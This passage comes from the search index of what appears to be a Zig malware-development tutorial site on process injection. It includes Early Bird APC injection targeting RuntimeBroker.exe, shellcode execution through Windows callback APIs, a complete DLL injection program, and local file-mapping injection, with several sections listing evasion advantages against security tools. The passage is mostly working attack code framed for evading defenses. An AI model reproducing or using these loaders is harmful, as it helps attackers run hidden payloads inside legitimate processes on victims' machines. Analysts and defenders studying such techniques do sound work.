@ptrCast(pAddress.?),  // Shellcode address cast as function pointer\n    hThread,               // Main thread handle\n    0,                     // No parameter data\n);\n</code></pre> <p>Critical Timing:</p> <ul> <li>APC is queued while thread is suspended/debugged</li> <li>When thread resumes, APC executes before original code</li> <li>Appears as legitimate process initialization</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#process-creation-and-target-selection","title":"Process Creation and Target Selection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#target-process-selection","title":"Target Process Selection","text":"<pre><code>const TARGET_PROCESS = \"RuntimeBroker.exe\";\n</code></pre> <p>RuntimeBroker.exe is chosen because:</p> <ul> <li>It's a legitimate Windows system process</li> <li>Commonly running on Windows systems</li> <li>Has appropriate privileges for demonstration</li> <li>Less likely to trigger security alerts</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#process-path-resolution","title":"Process Path Resolution","text":"<pre><code>fn createSuspendedProcess2(\n    lpProcessName: [*:0]const u8,\n    dwProcessId: *windows.DWORD,\n    hProcess: *windows.HANDLE,\n    hThread: *windows.HANDLE,\n    method: ProcessCreationMethod,\n) bool {\n    var lpPath: [MAX_PATH * 2]u8 = undefined;\n    var WnDr: [MAX_PATH]u8 = undefined;\n\n    // Get Windows directory (usually C:\\Windows)\n    if (GetEnvironmentVariableA(\"WINDIR\", &amp;WnDr, MAX_PATH) == 0) {\n        print(\"[!] GetEnvironmentVariableA Failed With Error : {d} \\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    // Build full path: C:\\Windows\\System32\\RuntimeBroker.exe\n    const formatted = std.fmt.bufPrintZ(&amp;lpPath, \"{s}\\\\System32\\\\{s}\", .{\n        WnDr[0..std.mem.indexOfScalar(u8, &amp;WnDr, 0).?],\n        std.mem.span(lpProcessName)\n    }) catch {\n        print(\"[!] Failed to format path\\n\", .{});\n        return false;\n    };\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#resume-methods","title":"Resume Methods","text":"<p>The technique uses different methods to resume execution based on the creation method:</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#create_suspended-resume","title":"CREATE_SUSPENDED Resume","text":"<pre><code>.CREATE_SUSPENDED =&gt; {\n    print(\"[i] Resuming The Target Process Thread ... \", .{});\n    const result = ResumeThread(hThread);\n    if (result == ~@as(windows.DWORD, 0)) {\n        print(\"[!] ResumeThread Failed With Error : {d} \\n\", .{windows.kernel32.GetLastError()});\n    } else {\n        print(\"[+] DONE \\n\\n\", .{});\n    }\n},\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#debug_process-resume","title":"DEBUG_PROCESS Resume","text":"<pre><code>.DEBUG_PROCESS =&gt; {\n    print(\"[i] Detaching The Target Process ... \", .{});\n    _ = DebugActiveProcessStop(dwProcessId);\n    print(\"[+] DONE \\n\\n\", .{});\n},\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#complete-execution-flow","title":"Complete Execution Flow","text":"<ol> <li>Process Creation: Create target process in suspended/debug state</li> <li>Memory Allocation: Allocate executable memory in target process</li> <li>Shellcode Injection: Write payload to allocated memory and make it executable</li> <li>APC Queuing: Queue shellcode as APC to main thread</li> <li>Process Resume: Resume execution triggering APC</li> <li>Cleanup: Close handles and exit</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#comparison-with-standard-apc-injection","title":"Comparison with Standard APC Injection","text":"Aspect Standard APC Injection Early Bird APC Injection Target Existing process/thread Newly created process Timing Runtime injection Pre-execution injection Detection Risk Medium (runtime behavior changes) Lower (appears as process initialization) Thread State Must find/create alertable thread Uses main thread directly Complexity Moderate Higher (cross-process operations) Stealth Good Excellent Reliability Depends on thread alertability High (guaranteed execution)"},{"location":"Advanced-Malware-Techniques/Process-Injection/APC-Injection/early_bird_apc_injection/#security-evasion-benefits","title":"Security Evasion Benefits","text":"<p>Early Bird APC injection provides several security evasion advantages:</p> <ol> <li>Process Legitimacy: Creates real system processes, not suspicious executables</li> <li>Timing Evasion: Executes before most runtime security hooks activate</li> <li>Memory Layout: Shellcode appears as part of normal process memory</li> <li>Behavioral Mimicry: Mimics normal process initialization patterns</li> <li>API Usage: Uses only legitimate Windows APIs in expected ways</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/","title":"Callback Code Execution","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Callback code execution is a technique that leverages Windows API functions that accept callback function pointers to execute shellcode. Instead of using traditional methods like CreateThread or VirtualAlloc, this approach casts shellcode as a legitimate callback function, making it appear more benign to security solutions.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#what-is-callback-function","title":"What Is Callback Function","text":"<p>A callback function is a function passed as an argument to another function, which is then invoked at a specific point during the execution of that function. In Windows, many APIs accept callback functions to handle events, enumerate resources, or perform asynchronous operations.</p> <p>The key insight for malware development is that these callback functions are executed in the same process context with the same privileges, making them perfect vehicles for shellcode execution. By casting shellcode as a callback function pointer, we can trick legitimate Windows APIs into executing our malicious code.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#common-callback-functions","title":"Common Callback Functions","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#using-createtimerqueuetimer","title":"Using CreateTimerQueueTimer","text":"<p><code>CreateTimerQueueTimer</code> creates a timer-queue timer that executes a callback function when the timer expires. This is one of the most reliable callback execution techniques.</p> <pre><code>extern \"kernel32\" fn CreateTimerQueueTimer(\n    phNewTimer: *?windows.HANDLE,\n    TimerQueue: ?windows.HANDLE,\n    Callback: WAITORTIMERCALLBACK,\n    Parameter: ?*anyopaque,\n    DueTime: windows.DWORD,\n    Period: windows.DWORD,\n    Flags: windows.ULONG,\n) callconv(WINAPI) windows.BOOL;\n\nconst WAITORTIMERCALLBACK = *const fn (?*anyopaque, windows.BOOL) callconv(WINAPI) void;\n\n// Cast the payload address to the callback function type\nconst callback = @as(WAITORTIMERCALLBACK, @ptrCast(&amp;payload));\n\nif (CreateTimerQueueTimer(\n    &amp;hTimer,\n    null, // TimerQueue - use default queue\n    callback, // Callback - our shellcode\n    null, // Parameter\n    0, // DueTime - execute immediately\n    0, // Period - execute once\n    0, // Flags\n) == 0) {\n    print(\"[!] CreateTimerQueueTimer Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n    return;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#using-enumchildwindows","title":"Using EnumChildWindows","text":"<p><code>EnumChildWindows</code> enumerates child windows and calls a callback function for each window found. When passed a <code>NULL</code> parent window, it enumerates all top-level windows.</p> <pre><code>extern \"user32\" fn EnumChildWindows(\n    hWndParent: ?HWND,\n    lpEnumFunc: WNDENUMPROC,\n    lParam: LPARAM,\n) callconv(WINAPI) windows.BOOL;\n\nconst WNDENUMPROC = *const fn (HWND, LPARAM) callconv(WINAPI) windows.BOOL;\n\n// Cast the payload address to the callback function type\nconst callback = @as(WNDENUMPROC, @ptrCast(&amp;payload));\n\nif (EnumChildWindows(null, // NULL parent enumerates all top-level windows\n    callback, // Our payload\n    0 // NULL lParam\n) == 0) {\n    print(\"[!] EnumChildWindows Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n    return;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#using-enumuilanguagesw","title":"Using EnumUILanguagesW","text":"<p><code>EnumUILanguagesW</code> enumerates the user interface languages available on the system, calling a callback function for each language found.</p> <pre><code>extern \"user32\" fn EnumUILanguagesW(\n    lpUILanguageEnumProc: UILANGUAGE_ENUMPROCW,\n    dwFlags: DWORD,\n    lParam: LPARAM\n) callconv(WINAPI) windows.BOOL;\n\nconst UILANGUAGE_ENUMPROCW = *const fn ([*:0]u16, LPARAM) callconv(WINAPI) windows.BOOL;\nconst MUI_LANGUAGE_NAME: DWORD = 0x8;\n\n// Cast the payload address to the callback function type\nconst callback = @as(UILANGUAGE_ENUMPROCW, @ptrCast(&amp;payload));\n\nif (EnumUILanguagesW(callback, MUI_LANGUAGE_NAME, 0) != 0) {\n    print(\"[!] EnumUILanguagesW Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n    return;\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#using-verifierenumerateresource","title":"Using VerifierEnumerateResource","text":"<p><code>VerifierEnumerateResource</code> is part of the Application Verifier framework and enumerates application resources, calling a callback for each resource found.</p> <pre><code>// Application Verifier callback function type\nconst AVRF_RESOURCE_ENUMERATE_CALLBACK = *const fn (\n    PVOID, // ResourceDescription\n    PVOID, // EnumerationContext\n    PULONG, // EnumerationLevel\n) callconv(WINAPI) ULONG;\n\n// Function pointer type for VerifierEnumerateResource\nconst FnVerifierEnumerateResource = *const fn (\n    HANDLE, // Process\n    ULONG, // Flags\n    ULONG, // ResourceType\n    AVRF_RESOURCE_ENUMERATE_CALLBACK, // ResourceCallback\n    ?PVOID, // EnumerationContext\n) callconv(WINAPI) ULONG;\n\n// Load verifier.dll dynamically\nhModule = LoadLibraryA(\"verifier.dll\");\nconst proc_addr = GetProcAddress(hModule.?, \"VerifierEnumerateResource\");\npVerifierEnumerateResource = @as(FnVerifierEnumerateResource, @ptrCast(proc_addr.?));\n\n// Cast the payload address to the callback function type\nconst callback = @as(AVRF_RESOURCE_ENUMERATE_CALLBACK, @ptrCast(&amp;payload));\n\n// Call VerifierEnumerateResource\n_ = pVerifierEnumerateResource.?(\n    GetCurrentProcess(),\n    0,\n    AvrfResourceHeapAllocation,\n    callback,\n    null,\n);\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#more","title":"More","text":"<p>The callback execution technique is versatile and can be applied to many Windows APIs. Some additional functions that accept callbacks include:</p> <ul> <li><code>EnumerateLoadedModules</code> - Enumerates loaded modules in a process</li> <li><code>EnumDirTreeW</code> - Enumerates directory trees with file patterns</li> <li><code>SymEnumProcesses</code> - Enumerates processes for symbol handling</li> <li><code>EnumPageFilesW</code> - Enumerates system paging files</li> <li><code>LdrEnumerateLoadedModules</code> - Low-level module enumeration via NTDLL</li> <li><code>EnumWindows</code> - Enumerates all top-level windows</li> <li><code>EnumResourceTypesW</code> - Enumerates resource types in modules</li> <li><code>EnumFontsW</code> - Enumerates fonts</li> </ul> <p>You can checkout more callback functions in this GitHub repository.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Callback-Code-Execution/callback_code_execution/#advantages-of-callback-execution","title":"Advantages Of Callback Execution","text":"<ol> <li>Evasion: Appears as legitimate API usage to security tools</li> <li>No Suspicious Allocations: Uses existing executable memory (.text section)</li> <li>No Thread Creation: Executes in the context of existing threads</li> <li>API Diversity: Many different APIs can be used, making detection harder</li> <li>Legitimate Context: Code runs through legitimate Windows API call chains</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/DLL-Injection/dll_injection/","title":"DLL Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/DLL-Injection/dll_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>DLL injection forces a target process to load an external dynamic library. By allocating space for the DLL path and invoking <code>LoadLibrary</code> via a remote thread, attackers can execute arbitrary code inside the victim process. This technique allows the malicious DLL to share the target's privileges and resources while remaining disguised as part of the normal application. The code example writes the path of a crafted DLL into the remote process and starts a new thread so the library gets loaded and its exported functions run in that context.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/DLL-Injection/dll_injection/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst kernel = windows.kernel32;\nconst print = std.debug.print;\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst LPVOID = windows.LPVOID;\nconst LPCWSTR = windows.LPCWSTR;\nconst SIZE_T = windows.SIZE_T;\n\n// Process access rights\nconst PROCESS_ALL_ACCESS = 0x001F0FFF;\nconst PROCESS_CREATE_THREAD = 0x0002;\nconst PROCESS_QUERY_INFORMATION = 0x0400;\nconst PROCESS_VM_OPERATION = 0x0008;\nconst PROCESS_VM_WRITE = 0x0020;\nconst PROCESS_VM_READ = 0x0010;\n\n// Memory allocation constants\nconst MEM_COMMIT = windows.MEM_COMMIT;\nconst MEM_RESERVE = windows.MEM_RESERVE;\nconst PAGE_READWRITE = windows.PAGE_READWRITE;\n\n// Snapshot constants\nconst TH32CS_SNAPPROCESS = windows.TH32CS_SNAPPROCESS;\nconst INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;\n\n// Process entry structure\nconst PROCESSENTRY32W = extern struct {\n    dwSize: DWORD,\n    cntUsage: DWORD,\n    th32ProcessID: DWORD,\n    th32DefaultHeapID: usize,\n    th32ModuleID: DWORD,\n    cntThreads: DWORD,\n    th32ParentProcessID: DWORD,\n    pcPriClassBase: i32,\n    dwFlags: DWORD,\n    szExeFile: [260]u16,\n};\n\n// Windows API function declarations\nconst CreateToolhelp32Snapshot = kernel.CreateToolhelp32Snapshot;\nextern \"kernel32\" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;\nextern \"kernel32\" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(.C) ?HANDLE;\nconst GetModuleHandleW = kernel.GetModuleHandleW;\nconst GetProcAddress = kernel.GetProcAddress;\nextern \"kernel32\" fn VirtualAllocEx(HANDLE, ?LPVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?LPVOID;\nconst WriteProcessMemory = windows.WriteProcessMemory;\nextern \"kernel32\" fn CreateRemoteThread(HANDLE, ?*anyopaque, SIZE_T, *const fn (?LPVOID) callconv(.C) DWORD, ?LPVOID, DWORD, ?*DWORD) callconv(.C) ?HANDLE;\nconst GetLastError = windows.GetLastError;\nconst CloseHandle = windows.CloseHandle;\nextern \"kernel32\" fn GetExitCodeThread(HANDLE, *DWORD) BOOL;\n\n// Helper function to wait for Enter key\nfn waitForEnter(message: []const u8) void {\n    print(\"{s}\", .{message});\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\n// Convert UTF-8 string to wide string\nfn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![:0]u16 {\n    return try std.unicode.utf8ToUtf16LeAllocZ(allocator, utf8_str);\n}\n\n// Compare wide strings (case-insensitive)\nfn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {\n    return windows.eqlIgnoreCaseWTF16(str1, str2);\n}\n\n// Get remote process PID by name (simplified to return just PID)\nfn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !DWORD {\n    const wide_process_name = try convertToWideString(allocator, process_name);\n    defer allocator.free(wide_process_name);\n\n    print(\"[i] Searching For Process Id Of \\\"{s}\\\" ... \", .{process_name});\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snapshot == INVALID_HANDLE_VALUE) {\n        print(\"[!] CreateToolhelp32Snapshot Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.SnapshotFailed;\n    }\n    defer _ = CloseHandle(snapshot);\n\n    var process_entry = std.mem.zeroes(PROCESSENTRY32W);\n    process_entry.dwSize = @sizeOf(PROCESSENTRY32W);\n\n    if (Process32FirstW(snapshot, &amp;process_entry) == 0) {\n        print(\"[!] Process32FirstW Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.ProcessEnumFailed;\n    }\n\n    while (true) {\n        var exe_name_len: usize = 0;\n        while (exe_name_len &lt; process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {\n            exe_name_len += 1;\n        }\n\n        const exe_name = process_entry.szExeFile[0..exe_name_len];\n\n        if (compareWideStringsIgnoreCase(exe_name, wide_process_name)) {\n            print(\"[+] DONE \\n\", .{});\n            print(\"[i] Found Target Process Pid: {d} \\n\", .{process_entry.th32ProcessID});\n            return process_entry.th32ProcessID;\n        }\n\n        if (Process32NextW(snapshot, &amp;process_entry) == 0) {\n            break;\n        }\n    }\n\n    print(\"[!] Process is Not Found \\n\", .{});\n    return error.ProcessNotFound;\n}\n\n// Main DLL injection function\nfn injectDllToRemoteProcess(h_process: HANDLE, dll_name: [:0]u16) BOOL {\n    var h_thread: ?HANDLE = null;\n    defer {\n        if (h_thread) |thread| {\n            _ = CloseHandle(thread);\n        }\n    }\n\n    // Calculate the size of DllName in bytes\n    const dw_size_to_write = (std.mem.len(dll_name.ptr) + 1) * @sizeOf(u16);\n\n    // Get the address of LoadLibraryW from kernel32.dll\n    const kernel32_handle = GetModuleHandleW(std.unicode.utf8ToUtf16LeStringLiteral(\"kernel32.dll\")) orelse {\n        print(\"[!] GetModuleHandleW Failed With Error: {d}\\n\", .{GetLastError()});\n        return 0;\n    };\n\n    const p_load_library_w = GetProcAddress(kernel32_handle, \"LoadLibraryW\") orelse {\n        print(\"[!] GetProcAddress Failed With Error: {d}\\n\", .{GetLastError()});\n        return 0;\n    };\n\n    // Allocate memory in the remote process\n    const p_address = VirtualAllocEx(\n        h_process,\n        null,\n        dw_size_to_write,\n        MEM_COMMIT | MEM_RESERVE,\n        PAGE_READWRITE,\n    ) orelse {\n        print(\"[!] VirtualAllocEx Failed With Error: {d}\\n\", .{GetLastError()});\n        return 0;\n    };\n\n    print(\"[i] pAddress Allocated At : 0x{x} Of Size : {d}\\n\", .{ @intFromPtr(p_address), dw_size_to_write });\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Write ... \");\n\n    // Cast to bytes (UTF-16), including the null terminator\n    const bytes = std.mem.sliceAsBytes(@as([*]u16, @ptrCast(dll_name))[0 .. dw_size_to_write / 2]);\n\n    // Write the DLL name to the remote process memory\n    const write_result = WriteProcessMemory(\n        h_process,\n        p_address,\n        bytes,\n    ) catch {\n        print(\"[!] WriteProcessMemory Failed With Error: {d}\\n\", .{GetLastError()});\n        return 0;\n    };\n\n    if (write_result != dw_size_to_write) {\n        print(\"[!] Expected to write: {d} bytes, actually wrote: {d} bytes\\n\", .{ dw_size_to_write, write_result });\n        return 0;\n    }\n\n    print(\"[i] Successfully Written {d} Bytes\\n\", .{write_result});\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Run ... \");\n\n    print(\"[i] Executing Payload ... \\n\", .{});\n\n    // Create a remote thread to execute LoadLibraryW with our DLL path\n    h_thread = CreateRemoteThread(\n        h_process,\n        null,\n        0,\n        @ptrCast(p_load_library_w),\n        p_address,\n        0,\n        null,\n    ) orelse {\n        print(\"[!] CreateRemoteThread Failed With Error: {d}\\n\", .{GetLastError()});\n        return 0;\n    };\n\n    windows.WaitForSingleObject(h_thread.?, windows.INFINITE) catch {\n        print(\"[!] WaitForSingleObject failed: {}\\n\", .{GetLastError()});\n    };\n\n    var exit_code: DWORD = 0;\n    if (GetExitCodeThread(h_thread.?, &amp;exit_code) == 0) {\n        print(\"[!] GetExitCodeThread failed: {}\\n\", .{GetLastError()});\n        return 1;\n    } else if (exit_code == 0) {\n        print(\"[!] LoadLibraryW returned NULL (DLL not found / load error)\\n\", .{});\n        return 1;\n    }\n\n    print(\"[+] DONE!\\n\", .{});\n    print(\"[+] DLL Injection Completed Successfully!\\n\", .{});\n\n    return 1; // TRUE\n}\n\n// Print usage information\nfn printUsage(program_name: []const u8) void {\n    print(\"[!] Usage : \\\"{s}\\\" &lt;Complete DLL Payload Path&gt; &lt;Process Name&gt;\\n\", .{program_name});\n}\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    const args = try std.process.argsAlloc(allocator);\n    defer std.process.argsFree(allocator, args);\n\n    if (args.len != 3) {\n        printUsage(args[0]);\n        std.process.exit(1);\n    }\n\n    const dll_path = args[1];\n    const process_name = args[2];\n\n    // It must be an absolute directory in order to run\n    const absolute = try std.fs.cwd().realpathAlloc(allocator, dll_path);\n    defer allocator.free(absolute);\n\n    // Find target process PID\n    const target_pid = try getRemoteProcessPid(allocator, process_name);\n\n    // Open target process\n    const target_process = OpenProcess(\n        PROCESS_ALL_ACCESS,\n        0, // bInheritHandle = FALSE\n        target_pid, // Now using just the PID (DWORD)\n    ) orelse {\n        print(\"[!] OpenProcess Failed With Error: {d}\\n\", .{GetLastError()});\n        print(\"[!] Try running as Administrator or check process permissions.\\n\", .{});\n        std.process.exit(1);\n    };\n    defer _ = CloseHandle(target_process);\n\n    // Convert DLL path to wide string\n    const wide_dll_path = try convertToWideString(allocator, absolute);\n    defer allocator.free(wide_dll_path);\n\n    // Inject DLL\n    const injection_result = injectDllToRemoteProcess(target_process, wide_dll_path);\n\n    if (injection_result == 1) {\n        print(\"\\n\", .{});\n        print(\"SUCCESS! DLL injection completed successfully!\\n\", .{});\n        print(\"Your payload should now be running in the target process!\\n\", .{});\n    } else {\n        print(\"\\n\", .{});\n        print(\"FAILED! DLL injection was not successful.\\n\", .{});\n        print(\"Check the error messages above for details.\\n\", .{});\n        std.process.exit(1);\n    }\n\n    waitForEnter(\"\\n[#] Press &lt;Enter&gt; To Exit ... \");\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/","title":"Local Mapping Injection","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Local mapping injection is a technique that utilizes Windows file mapping APIs to create executable memory regions without directly calling <code>VirtualAlloc</code> with <code>PAGE_EXECUTE_READWRITE</code> permissions. This approach leverages mapped memory to execute shellcode within the current process, making it less suspicious to some security solutions.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#why-mapping-injection","title":"Why Mapping Injection","text":"<p>Traditional shellcode execution often relies on <code>VirtualAlloc</code> with <code>RWX</code> permissions, which is a common indicator monitored by security solutions. Mapping injection offers several advantages:</p> <ul> <li>Use non-private memory: Memory allocated through file mapping is classified as mapped memory rather than private memory</li> <li>Evasion potential: Some security tools may not monitor file mapping operations as closely as direct memory allocation</li> <li>Legitimate API usage: File mapping APIs are commonly used by legitimate applications for memory management</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#mapped-memory","title":"Mapped Memory","text":"<p>In Windows, memory can be categorized into different types:</p> <ul> <li>Private memory: Memory allocated directly by the process (e.g., via <code>VirtualAlloc</code>)</li> <li>Mapped memory: Memory that is associated with a file or file mapping object</li> </ul> <p>When using file mapping, the memory is classified as mapped memory, which can help bypass certain security mechanisms that specifically monitor private memory allocations with executable permissions.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#local-mapping-injection_1","title":"Local Mapping Injection","text":"<p>Local mapping injection works by:</p> <ol> <li>Creating a file mapping object with <code>CreateFileMapping</code></li> <li>Mapping a view of the file into memory with <code>MapViewOfFile</code></li> <li>Writing shellcode to the mapped memory region</li> <li>Executing the shellcode directly in the current process</li> </ol> <p>This technique is particularly useful for:</p> <ul> <li>Executing shellcode in the current process</li> <li>Avoiding direct <code>VirtualAlloc</code> calls with executable permissions</li> <li>Creating memory regions that appear more legitimate to security solutions</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#needed-windows-api","title":"Needed Windows API","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#createfilemapping","title":"CreateFileMapping","text":"<pre><code>extern \"kernel32\" fn CreateFileMappingW(\n    hFile: HANDLE,\n    lpFileMappingAttributes: ?*windows.SECURITY_ATTRIBUTES,\n    flProtect: DWORD,\n    dwMaximumSizeHigh: DWORD,\n    dwMaximumSizeLow: DWORD,\n    lpName: ?[*:0]const u16,\n) callconv(WINAPI) ?HANDLE;\n</code></pre> <p>Creates a file mapping object for a specified file. When <code>hFile</code> is set to <code>INVALID_HANDLE_VALUE</code>, it creates a file mapping object backed by the system paging file.</p> <p>Parameters:</p> <ul> <li><code>hFile</code>: Handle to the file (use <code>INVALID_HANDLE_VALUE</code> for paging file)</li> <li><code>lpFileMappingAttributes</code>: Security attributes (can be null)</li> <li><code>flProtect</code>: Memory protection (e.g., <code>PAGE_EXECUTE_READWRITE</code>)</li> <li><code>dwMaximumSizeHigh</code>: High-order DWORD of maximum size</li> <li><code>dwMaximumSizeLow</code>: Low-order DWORD of maximum size</li> <li><code>lpName</code>: Name of the file mapping object (can be null)</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#mapviewoffile","title":"MapViewOfFile","text":"<pre><code>extern \"kernel32\" fn MapViewOfFile(\n    hFileMappingObject: HANDLE,\n    dwDesiredAccess: DWORD,\n    dwFileOffsetHigh: DWORD,\n    dwFileOffsetLow: DWORD,\n    dwNumberOfBytesToMap: SIZE_T,\n) callconv(WINAPI) ?PVOID;\n</code></pre> <p>Maps a view of a file mapping into the address space of the calling process.</p> <p>Parameters:</p> <ul> <li><code>hFileMappingObject</code>: Handle to the file mapping object</li> <li><code>dwDesiredAccess</code>: Access permissions (e.g., <code>FILE_MAP_WRITE | FILE_MAP_EXECUTE</code>)</li> <li><code>dwFileOffsetHigh</code>: High-order DWORD of file offset</li> <li><code>dwFileOffsetLow</code>: Low-order DWORD of file offset</li> <li><code>dwNumberOfBytesToMap</code>: Number of bytes to map</li> </ul>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#localmapinject-function","title":"localMapInject Function","text":"<p>The core function that performs the local mapping injection:</p> <pre><code>fn localMapInject(pPayload: []const u8, ppAddress: *?PVOID) bool {\n    var bState: bool = true;\n    var hFile: ?HANDLE = null;\n    var pMapAddress: ?PVOID = null;\n\n    // Create a file mapping handle with RWX memory permissions\n    hFile = CreateFileMappingW(\n        INVALID_HANDLE_VALUE,\n        null,\n        PAGE_EXECUTE_READWRITE,\n        0,\n        @intCast(pPayload.len),\n        null,\n    );\n\n    if (hFile == null) {\n        print(\"[!] CreateFileMapping Failed With Error : {}\\n\", .{windows.kernel32.GetLastError()});\n        bState = false;\n        ppAddress.* = null;\n        return bState;\n    }\n\n    // Map the view of the payload to memory\n    pMapAddress = MapViewOfFile(\n        hFile.?,\n        FILE_MAP_WRITE | FILE_MAP_EXECUTE,\n        0,\n        0,\n        pPayload.len,\n    );\n\n    if (pMapAddress == null) {\n        print(\"[!] MapViewOfFile Failed With Error : {}\\n\", .{windows.kernel32.GetLastError()});\n        bState = false;\n        ppAddress.* = null;\n        if (hFile) |handle| _ = CloseHandle(handle);\n        return bState;\n    }\n\n    print(\"[i] pMapAddress : 0x{X}\\n\", .{@intFromPtr(pMapAddress.?)});\n\n    // Copy payload to mapped memory\n    const dest = @as([*]u8, @ptrCast(pMapAddress.?));\n    @memcpy(dest[0..pPayload.len], pPayload);\n\n    ppAddress.* = pMapAddress;\n    if (hFile) |handle| _ = CloseHandle(handle);\n    return bState;\n}\n</code></pre> <p>Process Flow:</p> <ol> <li>Create file mapping: Uses <code>CreateFileMappingW</code> with <code>INVALID_HANDLE_VALUE</code> to create a mapping backed by the paging file</li> <li>Map view: Uses <code>MapViewOfFile</code> to map the file into the process address space with write and execute permissions</li> <li>Copy payload: Copies the shellcode into the mapped memory region</li> <li>Return address: Returns the base address of the mapped memory for execution</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#unmapviewoffile","title":"UnmapViewOfFile","text":"<pre><code>extern \"kernel32\" fn UnmapViewOfFile(lpBaseAddress: PVOID) callconv(WINAPI) BOOL;\n</code></pre> <p>While not used in this specific example, <code>UnmapViewOfFile</code> is important for cleanup operations. It unmaps a mapped view of a file from the calling process's address space.</p> <p>Usage:</p> <pre><code>// Clean up the mapped memory\nif (pMapAddress) |addr| {\n    _ = UnmapViewOfFile(addr);\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#key-advantages","title":"Key Advantages","text":"<ol> <li>Evasion: Uses legitimate file mapping APIs instead of direct memory allocation</li> <li>Memory classification: Creates mapped memory rather than private memory</li> <li>Flexibility: Can be extended for more complex scenarios like remote process injection</li> <li>Legitimate appearance: File mapping is commonly used by legitimate applications</li> </ol>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/local_mapping_injection/#limitations","title":"Limitations","text":"<ol> <li>Local execution only: This implementation only works within the current process</li> <li>Still detectable: Advanced security solutions may still detect the technique</li> <li>Memory permissions: Still requires executable memory permissions, which can be monitored</li> </ol> <p>This technique demonstrates how alternative Windows APIs can be used to achieve similar results to traditional methods while potentially evading some security controls.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Mapping-Injection/remote_mapping_injection/","title":"Remote Mapping 